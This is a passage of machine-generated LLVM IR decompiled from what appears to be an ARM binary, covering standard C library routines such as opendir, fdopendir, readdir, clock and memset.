  %v0_12764 = load i32, i32* @r4, align 4
  %v2_12764 = add i32 %v0_12734, 20
  %v3_12764 = inttoptr i32 %v2_12764 to i32*
  store i32 %v0_12764, i32* %v3_12764, align 4
  %v1_12768 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_12768, i32* %v3_12764, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_12734, i32* @r5, align 4
  %v0_12770 = load i32, i32* @r7, align 4
  %v2_12770 = inttoptr i32 %v0_12734 to i32*
  store i32 %v0_12770, i32* %v2_12770, align 4
  %v0_12774 = load i32, i32* @r5, align 4
  %v1_12774 = add i32 %v0_12774, 20
  %v2_12774 = inttoptr i32 %v1_12774 to i32*
  %v3_12774 = load i32, i32* %v2_12774, align 4
  store i32 %v3_12774, i32* %r1.global-to-local, align 4
  %v2_1277c = call i32 @calloc(i32 1, i32 %v3_12774)
  %v2_12780 = icmp eq i32 %v2_1277c, 0
  store i32 %v2_1277c, i32* @r4, align 4
  %v1_12788 = load i32, i32* @r5, align 4
  %v2_12788 = add i32 %v1_12788, 12
  %v3_12788 = inttoptr i32 %v2_12788 to i32*
  store i32 %v2_1277c, i32* %v3_12788, align 4
  br i1 %v2_12780, label %dec_label_pc_12790, label %dec_label_pc_127a0

dec_label_pc_12790:                               ; preds = %bb17
  %v0_12790 = load i32, i32* @r5, align 4
  store i32 %v0_12790, i32* @r0, align 4
  %v0_12794 = call i32 @free()
  %v0_12798 = load i32, i32* @r4, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127a0:                               ; preds = %bb17
  %v0_127a4 = load i32, i32* @r6, align 4
  %v2_127a4 = add i32 %v0_127a4, -34032
  store i32 %v2_127a4, i32* %r3.global-to-local, align 4
  %v1_127ac = inttoptr i32 %v2_127a4 to i32*
  %v2_127ac = load i32, i32* %v1_127ac, align 4
  %v3_127ac = add i32 %v0_127a4, -34028
  %v4_127ac = inttoptr i32 %v3_127ac to i32*
  %v5_127ac = load i32, i32* %v4_127ac, align 4
  store i32 %v5_127ac, i32* %r1.global-to-local, align 4
  %v6_127ac = add i32 %v0_127a4, -34024
  %v7_127ac = inttoptr i32 %v6_127ac to i32*
  %v8_127ac = load i32, i32* %v7_127ac, align 4
  store i32 %v8_127ac, i32* %r2.global-to-local, align 4
  %v9_127ac = add i32 %v0_127a4, -34020
  %v10_127ac = inttoptr i32 %v9_127ac to i32*
  %v11_127ac = load i32, i32* %v10_127ac, align 4
  store i32 %v11_127ac, i32* %r3.global-to-local, align 4
  %v12_127ac = add i32 %v0_127a4, -34016
  %v1_127b8 = inttoptr i32 %v12_127ac to i32*
  %v2_127b8 = load i32, i32* %v1_127b8, align 4
  %v3_127b8 = add i32 %v0_127a4, -34012
  %v4_127b8 = inttoptr i32 %v3_127b8 to i32*
  %v5_127b8 = load i32, i32* %v4_127b8, align 4
  store i32 %v2_127b8, i32* %stack_var_-32, align 4
  store i32 %v5_127ac, i32* %r1.global-to-local, align 4
  store i32 %v8_127ac, i32* %r2.global-to-local, align 4
  store i32 %v11_127ac, i32* %r3.global-to-local, align 4
  %v0_127c8 = load i32, i32* @r5, align 4
  %v1_127c8 = add i32 %v0_127c8, 24
  %v1_127cc = inttoptr i32 %v1_127c8 to i32*
  store i32 %v2_127ac, i32* %v1_127cc, align 4
  %v3_127cc = add i32 %v0_127c8, 28
  %v4_127cc = inttoptr i32 %v3_127cc to i32*
  %v5_127cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_127cc, i32* %v4_127cc, align 4
  %v6_127cc = add i32 %v0_127c8, 32
  %v7_127cc = inttoptr i32 %v6_127cc to i32*
  %v8_127cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_127cc, i32* %v7_127cc, align 4
  %v9_127cc = add i32 %v0_127c8, 36
  %v10_127cc = inttoptr i32 %v9_127cc to i32*
  %v11_127cc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_127cc, i32* %v10_127cc, align 4
  %v12_127cc = add i32 %v0_127c8, 40
  %v2_127d0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_127b8, i32* %r1.global-to-local, align 4
  %v1_127d4 = inttoptr i32 %v12_127cc to i32*
  store i32 %v2_127d0, i32* %v1_127d4, align 4
  %v3_127d4 = add i32 %v0_127c8, 44
  %v4_127d4 = inttoptr i32 %v3_127d4 to i32*
  %v5_127d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_127d4, i32* %v4_127d4, align 4
  %v0_127d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %bb, %dec_label_pc_12790, %dec_label_pc_127a0
  %v0_127d8 = phi i32 [ 0, %bb ], [ %v0_12798, %dec_label_pc_12790 ], [ %v0_127d8.pre, %dec_label_pc_127a0 ]
  store i32 %v3_12720, i32* @r4, align 4
  store i32 %v6_12720, i32* @r5, align 4
  store i32 %v9_12720, i32* @r6, align 4
  store i32 %v12_12720, i32* @r7, align 4
  ret i32 %v0_127d8

; uselistorder directives
  uselistorder i32 %v2_1277c, { 1, 0, 2 }
  uselistorder i32 %v0_12734, { 2, 1, 5, 0, 4, 6, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 11, 10, 1, 6, 2, 7, 12, 8, 13, 9, 14, 3, 15, 4, 16, 0, 17, 5, 18 }
  uselistorder label %dec_label_pc_127d8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_127f0 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_127f8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_12828, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %entry
  %v0_12814 = call i32 @__aeabi_read_tp()
  %v3_12818 = load i16, i16* @global_var_23424.488, align 2
  %v4_12818 = sext i16 %v3_12818 to i32
  %v0_1281c = load i32, i32* %r2.global-to-local, align 4
  %v1_1281c = sub i32 0, %v0_1281c
  store i32 %v1_1281c, i32* %r2.global-to-local, align 4
  %v3_12820 = add i32 %v4_12818, %v0_12814
  %v4_12820 = inttoptr i32 %v3_12820 to i32*
  store i32 %v1_1281c, i32* %v4_12820, align 4
  br label %dec_label_pc_1284c

dec_label_pc_12828:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_12828 = icmp slt i32 %arg1, 0
  br i1 %v1_12828, label %dec_label_pc_1284c, label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %dec_label_pc_12828
  store i32 %v2_127f8, i32* @r1, align 4
  %v0_12834 = call i32 @fstat()
  %v1_12838 = icmp slt i32 %v0_12834, 0
  br i1 %v1_12838, label %dec_label_pc_12840, label %dec_label_pc_12854

dec_label_pc_12840:                               ; preds = %dec_label_pc_12830
  br label %dec_label_pc_1284c

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12840, %dec_label_pc_12828, %dec_label_pc_12810
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12898

dec_label_pc_12854:                               ; preds = %dec_label_pc_12830
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1285c = load i32, i32* @r7, align 4
  %v3_12860 = call i32 @__GI___fcntl_nocancel(i32 %v0_1285c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12868 = load i32, i32* @r7, align 4
  %v2_1286c = call i32 @fd_to_DIR(i32 %v0_12868, i32 %tmp)
  store i32 %v2_1286c, i32* %r1.global-to-local, align 4
  %v2_12870 = icmp eq i32 %v2_1286c, 0
  br i1 %v2_12870, label %dec_label_pc_12878, label %dec_label_pc_12898

dec_label_pc_12878:                               ; preds = %dec_label_pc_12854
  %v0_12888 = call i32 @__aeabi_read_tp()
  %v3_1288c = load i16, i16* @global_var_23424.488, align 2
  %v4_1288c = sext i16 %v3_1288c to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12894 = add i32 %v4_1288c, %v0_12888
  %v4_12894 = inttoptr i32 %v3_12894 to i32*
  store i32 12, i32* %v4_12894, align 4
  %v0_12898.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_12854, %dec_label_pc_1284c, %dec_label_pc_12878
  %v0_12898 = phi i32 [ %v2_1286c, %dec_label_pc_12854 ], [ 0, %dec_label_pc_1284c ], [ %v0_12898.pre, %dec_label_pc_12878 ]
  store i32 %v3_127f0, i32* @r7, align 4
  ret i32 %v0_12898

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12898, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_128a8:
  %v0_128a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_128a8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_128a8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_128a8, %bb
  %v4_128b0 = phi i32 [ %arg1, %dec_label_pc_128a8 ], [ 0, %bb ]
  ret i32 %v4_128b0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_128b8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_128b8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_128c4 = call i32 @fstat()
  store i32 %v0_128c4, i32* @r5, align 4
  %v2_128c8 = icmp eq i32 %v0_128c4, 0
  br i1 %v2_128c8, label %dec_label_pc_128d0, label %dec_label_pc_12948

dec_label_pc_128d0:                               ; preds = %entry
  %v1_128d4 = and i32 %tmp4, 61440
  store i32 %v1_128d4, i32* @r3, align 4
  %v7_128d8 = icmp eq i32 %v1_128d4, 16384
  br i1 %v7_128d8, label %dec_label_pc_128f8, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d0
  %v0_128e4 = call i32 @__aeabi_read_tp()
  %v3_128e8 = load i16, i16* @global_var_23424.488, align 2
  %v0_128ec = load i32, i32* @r5, align 4
  store i32 %v0_128ec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1292c

dec_label_pc_128f8:                               ; preds = %dec_label_pc_128d0
  %v0_128f8 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_12900 = call i32 @__libc_fcntl(i32 %v0_128f8, i32 3)
  %v7_12904 = icmp eq i32 %v2_12900, -1
  br i1 %v7_12904, label %dec_label_pc_12948, label %dec_label_pc_1290c

dec_label_pc_1290c:                               ; preds = %dec_label_pc_128f8
  %v1_1290c = urem i32 %v2_12900, 4
  store i32 %v1_1290c, i32* %r3.global-to-local, align 4
  %v7_12910 = icmp eq i32 %v1_1290c, 1
  br i1 %v7_12910, label %dec_label_pc_12918, label %dec_label_pc_12934

dec_label_pc_12918:                               ; preds = %dec_label_pc_1290c
  %v0_1291c = call i32 @__aeabi_read_tp()
  %v3_12920 = load i16, i16* @global_var_23424.488, align 2
  %v0_12924 = load i32, i32* @r5, align 4
  store i32 %v0_12924, i32* %r1.global-to-local, align 4
  %v0_12928 = load i32, i32* %r3.global-to-local, align 4
  %v1_12928 = add i32 %v0_12928, 21
  br label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12918
  %v2_1292c.in = phi i16 [ %v3_128e8, %dec_label_pc_128e0 ], [ %v3_12920, %dec_label_pc_12918 ]
  %v1_1292c = phi i32 [ %v0_128e4, %dec_label_pc_128e0 ], [ %v0_1291c, %dec_label_pc_12918 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_128e0 ], [ %v1_12928, %dec_label_pc_12918 ]
  %v2_1292c = sext i16 %v2_1292c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1292c = add i32 %v1_1292c, %v2_1292c
  %v4_1292c = inttoptr i32 %v3_1292c to i32*
  store i32 %storemerge, i32* %v4_1292c, align 4
  %v0_1294c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1294c

dec_label_pc_12934:                               ; preds = %dec_label_pc_1290c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12938 = load i32, i32* @r4, align 4
  %v2_1293c = call i32 @fd_to_DIR(i32 %v0_12938, i32 %tmp)
  store i32 %v2_1293c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1294c

dec_label_pc_12948:                               ; preds = %entry, %dec_label_pc_128f8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1294c

dec_label_pc_1294c:                               ; preds = %dec_label_pc_12934, %dec_label_pc_1292c, %dec_label_pc_12948
  %v0_1294c = phi i32 [ %v2_1293c, %dec_label_pc_12934 ], [ %v0_1294c.pre, %dec_label_pc_1292c ], [ 0, %dec_label_pc_12948 ]
  ret i32 %v0_1294c

; uselistorder directives
  uselistorder i32 %v1_1290c, { 1, 0 }
  uselistorder i32 %v2_12900, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 3, 0, 4, 5, 2, 1, 6 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1294c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12948, { 1, 0 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_12964 = load i32, i32* @r4, align 4
  %v6_12964 = load i32, i32* @r5, align 4
  %v9_12964 = load i32, i32* @r6, align 4
  %v12_12964 = load i32, i32* @r7, align 4
  %v15_12964 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  %v1_12978 = add i32 %tmp, 24
  store i32 %v1_12978, i32* @r4, align 4
  %v4_1297c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), align 4
  store i32 %v4_1297c, i32* %r1.global-to-local, align 4
  store i32 %v1_12978, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_12990 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12990)
  %v0_129a4 = load i32, i32* @r6, align 4
  %v2_129a4 = add i32 %v0_129a4, 16
  %v3_129a4 = inttoptr i32 %v2_129a4 to i32*
  %v4_129a4 = load i32, i32* %v3_129a4, align 4
  store i32 %v4_129a4, i32* @ip, align 4
  store i32 76208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_129a4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129e4, %entry
  %v0_129b4 = load i32, i32* @r5, align 4
  %v1_129b4 = add i32 %v0_129b4, 4
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  store i32 %v3_129b4, i32* %r2.global-to-local, align 4
  %v4_129b4 = add i32 %v0_129b4, 8
  %v5_129b4 = inttoptr i32 %v4_129b4 to i32*
  %v6_129b4 = load i32, i32* %v5_129b4, align 4
  %tmp10 = icmp ugt i32 %v6_129b4, %v3_129b4
  br i1 %tmp10, label %dec_label_pc_129e4, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_129b4
  %v1_129c0 = inttoptr i32 %v0_129b4 to i32*
  %v2_129c0 = load i32, i32* %v1_129c0, align 4
  %v1_129c4 = add i32 %v0_129b4, 12
  %v2_129c4 = inttoptr i32 %v1_129c4 to i32*
  %v3_129c4 = load i32, i32* %v2_129c4, align 4
  store i32 %v3_129c4, i32* %r1.global-to-local, align 4
  %v1_129c8 = add i32 %v0_129b4, 20
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  store i32 %v3_129c8, i32* %r2.global-to-local, align 4
  %v4_129cc = call i32 @__getdents(i32 %v2_129c0, i32 %v3_129c4, i32 %v3_129c8, i32 %v6_129b4)
  %tmp9 = icmp slt i32 %v4_129cc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_129dc

.thread:                                          ; preds = %dec_label_pc_129c0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12a10

dec_label_pc_129dc:                               ; preds = %dec_label_pc_129c0
  %v1_129dc = load i32, i32* @r5, align 4
  %v2_129dc = add i32 %v1_129dc, 8
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  store i32 %v4_129cc, i32* %v3_129dc, align 4
  %v0_129e0 = load i32, i32* @r7, align 4
  %v1_129e0 = load i32, i32* @r5, align 4
  %v2_129e0 = add i32 %v1_129e0, 4
  %v3_129e0 = inttoptr i32 %v2_129e0 to i32*
  store i32 %v0_129e0, i32* %v3_129e0, align 4
  %v0_129e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129b4, %dec_label_pc_129dc
  %v1_129f4 = phi i32 [ %v0_129b4, %dec_label_pc_129b4 ], [ %v0_129e4.pre, %dec_label_pc_129dc ]
  %v1_129e4 = add i32 %v1_129f4, 4
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r2.global-to-local, align 4
  %v1_129e8 = add i32 %v1_129f4, 12
  %v2_129e8 = inttoptr i32 %v1_129e8 to i32*
  %v3_129e8 = load i32, i32* %v2_129e8, align 4
  store i32 %v3_129e8, i32* %r1.global-to-local, align 4
  %v2_129ec = add i32 %v3_129e8, %v3_129e4
  store i32 %v2_129ec, i32* @r4, align 4
  %v1_129f0 = add i32 %v2_129ec, 4
  %v2_129f0 = inttoptr i32 %v1_129f0 to i32*
  %v3_129f0 = load i32, i32* %v2_129f0, align 4
  %v2_129f4 = add i32 %v1_129f4, 16
  %v3_129f4 = inttoptr i32 %v2_129f4 to i32*
  store i32 %v3_129f0, i32* %v3_129f4, align 4
  %v0_129f8 = load i32, i32* @r4, align 4
  %v1_129f8 = add i32 %v0_129f8, 8
  %v2_129f8 = inttoptr i32 %v1_129f8 to i16*
  %v3_129f8 = load i16, i16* %v2_129f8, align 2
  %v4_129f8 = zext i16 %v3_129f8 to i32
  %v0_129fc = load i32, i32* %r2.global-to-local, align 4
  %v1_129fc = load i32, i32* %r1.global-to-local, align 4
  %v2_129fc = add i32 %v1_129fc, %v0_129fc
  %v3_129fc = inttoptr i32 %v2_129fc to i32*
  %v4_129fc = load i32, i32* %v3_129fc, align 4
  store i32 %v4_129fc, i32* %r1.global-to-local, align 4
  %v2_12a00 = add i32 %v0_129fc, %v4_129f8
  %v2_12a04 = icmp eq i32 %v4_129fc, 0
  %v1_12a08 = load i32, i32* @r5, align 4
  %v2_12a08 = add i32 %v1_12a08, 4
  %v3_12a08 = inttoptr i32 %v2_12a08 to i32*
  store i32 %v2_12a00, i32* %v3_12a08, align 4
  br i1 %v2_12a04, label %dec_label_pc_129b4, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_129e4, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_12a1c = load i32, i32* @r6, align 4
  %v2_12a1c = add i32 %v0_12a1c, 44
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  %v4_12a1c = load i32, i32* %v3_12a1c, align 4
  call void @__pseudo_branch(i32 %v4_12a1c)
  %v0_12a28 = load i32, i32* @r4, align 4
  store i32 %v3_12964, i32* @r4, align 4
  store i32 %v6_12964, i32* @r5, align 4
  store i32 %v9_12964, i32* @r6, align 4
  store i32 %v12_12964, i32* @r7, align 4
  store i32 %v15_12964, i32* @lr, align 4
  ret i32 %v0_12a28

; uselistorder directives
  uselistorder i32 %v1_129f4, { 0, 2, 1 }
  uselistorder i32 %v6_129b4, { 1, 0 }
  uselistorder i32 %v0_129b4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_129e4, { 1, 0 }
}

define i32 @function_12a3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a3c:
  %v0_12a3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a3c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12a3c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a3c, %bb
  %v4_12a48 = phi i32 [ %arg1, %dec_label_pc_12a3c ], [ 0, %bb ]
  ret i32 %v4_12a48

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_12a4c = load i32, i32* @lr, align 4
  %v0_12a54 = call i32 @__aeabi_read_tp()
  %v3_12a58 = load i16, i16* @global_var_23424.488, align 2
  %v4_12a58 = sext i16 %v3_12a58 to i32
  %v2_12a5c = add i32 %v4_12a58, %v0_12a54
  store i32 %v0_12a4c, i32* @lr, align 4
  ret i32 %v2_12a5c
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_12a70 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12a70, i32* @r0, align 4
  %v1_12a78 = call i32 @times(i32 %v2_12a70)
  %v2_12a7c = load i32, i32* %stack_var_-24, align 4
  %v2_12a80 = add i32 %v2_12a7c, %tmp
  %v2_12a88 = mul i32 %v2_12a80, 10000
  %v1_12a8c = and i32 %v2_12a88, 2147483632
  ret i32 %v1_12a8c

; uselistorder directives
  uselistorder i32 %v2_12a70, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_12aa0 = call i32 @_memcpy()
  ret i32 %v0_12aa0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12ab0 = call i32 @_memcpy()
  ret i32 %v0_12ab0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_12ac4 = icmp eq i32 %arg3, 8
  store i1 %v8_12ac4, i1* %cpsr_z.global-to-local, align 1
  %v5_12ac8 = icmp slt i32 %arg3, 8
  br i1 %v5_12ac8, label %dec_label_pc_12b28, label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %entry
  %v4_12acc = mul i32 %arg2, 256
  %v5_12acc = or i32 %v4_12acc, %arg2
  %v4_12ad0 = mul i32 %v5_12acc, 65536
  %v5_12ad0 = or i32 %v4_12ad0, %v5_12acc
  store i32 %v5_12ad0, i32* @r1, align 4
  %v1_12ad457 = urem i32 %tmp, 4
  %v2_12ad458 = icmp eq i32 %v1_12ad457, 0
  store i1 %v2_12ad458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_12ad458, label %dec_label_pc_12ae4, label %bb

bb:                                               ; preds = %dec_label_pc_12acc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_12acc ]
  %v3_12ad859 = phi i32 [ %v6_12ad8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_12acc ]
  %v4_12ad8 = inttoptr i32 %v3_12ad859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_12ad8, align 1
  %v5_12ad8 = load i32, i32* @r3, align 4
  %v6_12ad8 = add i32 %v5_12ad8, 1
  store i32 %v6_12ad8, i32* @r3, align 4
  %v0_12adc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12ae8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_12adc.pr, label %dec_label_pc_12ae4, label %.thread

.thread:                                          ; preds = %bb
  %v2_12adc = add i32 %v0_12ae8.pr.pre, -1
  store i32 %v2_12adc, i32* %r2.global-to-local, align 4
  %v1_12ad4 = urem i32 %v6_12ad8, 4
  %v2_12ad4 = icmp eq i32 %v1_12ad4, 0
  store i1 %v2_12ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ad4, label %dec_label_pc_12ae4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12ad8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_12ad8.pre to i8
  br label %bb

dec_label_pc_12ae4:                               ; preds = %.thread, %bb, %dec_label_pc_12acc
  %v0_12af028 = phi i32 [ %tmp, %dec_label_pc_12acc ], [ %v6_12ad8, %bb ], [ %v6_12ad8, %.thread ]
  %v0_12ae8.pr = phi i32 [ %arg3, %dec_label_pc_12acc ], [ %v0_12ae8.pr.pre, %bb ], [ %v2_12adc, %.thread ]
  %v0_12ae4 = load i32, i32* @r1, align 4
  store i32 %v0_12ae4, i32* %ip.global-to-local, align 4
  %v8_12ae810 = icmp eq i32 %v0_12ae8.pr, 8
  store i1 %v8_12ae810, i1* %cpsr_z.global-to-local, align 1
  %v5_12aec11 = icmp slt i32 %v0_12ae8.pr, 8
  br i1 %v5_12aec11, label %dec_label_pc_12b28, label %dec_label_pc_12af0.preheader

dec_label_pc_12af0.preheader:                     ; preds = %dec_label_pc_12ae4
  %v1_12af046 = inttoptr i32 %v0_12af028 to i32*
  store i32 %v0_12ae4, i32* %v1_12af046, align 4
  %v3_12af047 = add i32 %v0_12af028, 4
  %v4_12af048 = inttoptr i32 %v3_12af047 to i32*
  %v5_12af049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12af049, i32* %v4_12af048, align 4
  %v6_12af050 = add i32 %v0_12af028, 8
  store i32 %v6_12af050, i32* @r3, align 4
  %v0_12af451 = load i32, i32* %r2.global-to-local, align 4
  %v1_12af452 = add i32 %v0_12af451, -8
  store i32 %v1_12af452, i32* %r2.global-to-local, align 4
  %v5_12afc53 = icmp slt i32 %v1_12af452, 8
  br i1 %v5_12afc53, label %dec_label_pc_12af0.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12b00

dec_label_pc_12b00:                               ; preds = %dec_label_pc_12af0.preheader, %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge
  %v6_12af055 = phi i32 [ %v6_12af0, %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge ], [ %v6_12af050, %dec_label_pc_12af0.preheader ]
  %v0_12af054 = phi i32 [ %v12_12b1c, %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge ], [ %v0_12af028, %dec_label_pc_12af0.preheader ]
  %v1_12b00 = inttoptr i32 %v6_12af055 to i32*
  %v2_12b00 = load i32, i32* @r1, align 4
  store i32 %v2_12b00, i32* %v1_12b00, align 4
  %v3_12b00 = add i32 %v0_12af054, 12
  %v4_12b00 = inttoptr i32 %v3_12b00 to i32*
  %v5_12b00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12b00, i32* %v4_12b00, align 4
  %v6_12b00 = add i32 %v0_12af054, 16
  store i32 %v6_12b00, i32* @r3, align 4
  %v0_12b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b04 = add i32 %v0_12b04, -8
  store i32 %v1_12b04, i32* %r2.global-to-local, align 4
  %v5_12b0c = icmp slt i32 %v1_12b04, 8
  br i1 %v5_12b0c, label %dec_label_pc_12b00.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12b00
  %v1_12b10 = inttoptr i32 %v6_12b00 to i32*
  %v2_12b10 = load i32, i32* @r1, align 4
  store i32 %v2_12b10, i32* %v1_12b10, align 4
  %v3_12b10 = add i32 %v0_12af054, 20
  %v4_12b10 = inttoptr i32 %v3_12b10 to i32*
  %v5_12b10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12b10, i32* %v4_12b10, align 4
  %v6_12b10 = add i32 %v0_12af054, 24
